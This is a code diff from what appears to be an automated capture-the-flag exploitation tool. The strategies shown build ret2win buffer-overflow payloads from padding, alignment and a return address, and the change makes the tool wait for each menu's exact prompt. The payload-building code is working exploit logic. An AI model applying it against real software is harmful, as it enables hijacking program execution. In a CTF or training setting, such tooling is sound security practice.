@@ -165,12 +165,13 @@ def s_ret2win(ch: Challenge, f: Facts) -> Iterable[Plan]:
         for pre in _presets(ch, f):
             for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                 payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(win.addr) + _term(sink)
-                for m in menu:
-                    steps = ([Send(m), Wait()] if m else []) + ([Send(pre)] if pre else [])
+                for m, prompt in menu:
+                    steps = ([Send(m), Wait(prompt)] if m else []) + ([Send(pre)] if pre else [])
                     steps.append(Send(payload))
                     yield Plan("ret2win", steps,
                                f"jump to {win.evidence} @ {hex(win.addr)} off={off} "
-                               f"align={int(align)}" + (f" menu={m!r}" if m else ""))
+                               f"align={int(align)}" + (f" menu={m!r}" if m else "")
+                               + (f" prompt={prompt!r}" if prompt else ""))
 
 
 # --------------------------------------------------------------------------- 0. 纯 int 0x80（无 libc）
@@ -271,15 +272,20 @@ def s_syscall_execve(ch: Challenge, f: Facts) -> Iterable[Plan]:
 def _prelude_variants(f: Facts) -> list:
     """菜单式程序需要先发选择字符（'w\\n'）才进得去漏洞函数。
 
-    返回候选前缀列表；没有菜单的题返回 [b""]。
+    返回 [(menu_bytes, prompt_bytes)] 候选；prompt 是该函数的入口提示串
+    （v7.1.0），有则策略用 `Wait(prompt)` 精确等待，无则退化 `Wait()`（盲等静默）。
+    没有菜单的题返回 [(b"", b"")]。
     """
     seen, out = set(), []
-    for prefs in (getattr(f, "interact", {}) or {}).values():
+    prompts = getattr(f, "prompts", {}) or {}
+    for entry, prefs in (getattr(f, "interact", {}) or {}).items():
+        pr = (prompts.get(entry) or prompts.get(None) or [])
+        prompt = pr[0] if pr else b""
         for p in prefs:
-            if p not in seen:
-                seen.add(p)
-                out.append(p)
-    return out or [b""]
+            if (p, prompt) not in seen:
+                seen.add((p, prompt))
+                out.append((p, prompt))
+    return out or [(b"", b"")]
 
 
 def _gate_offsets(f: Facts, v) -> list:
@@ -374,11 +380,12 @@ def s_ret2win_flag(ch: Challenge, f: Facts) -> Iterable[Plan]:
             for align in ((False, True) if ch.elf.bits == 64 else (False,)):
                 for tgt in targets:
                     payload = _pad(ch, off) + _align(ch, f, align) + ch.p64(tgt) + _term(sink)
-                    for m in menu:
-                        steps = ([Send(m), Wait()] if m else []) + [Send(payload)]
+                    for m, prompt in menu:
+                        steps = ([Send(m), Wait(prompt)] if m else []) + [Send(payload)]
                         yield Plan("ret2flag", steps,
                                    f"jump to {w.evidence} @ {hex(tgt)} off={off} align={int(align)}"
-                                   + (f" menu={m!r}" if m else ""), tag="flag")
+                                   + (f" menu={m!r}" if m else "")
+                                   + (f" prompt={prompt!r}" if prompt else ""), tag="flag")
 
 
 # --------------------------------------------------------------------------- 2. ret2system@plt
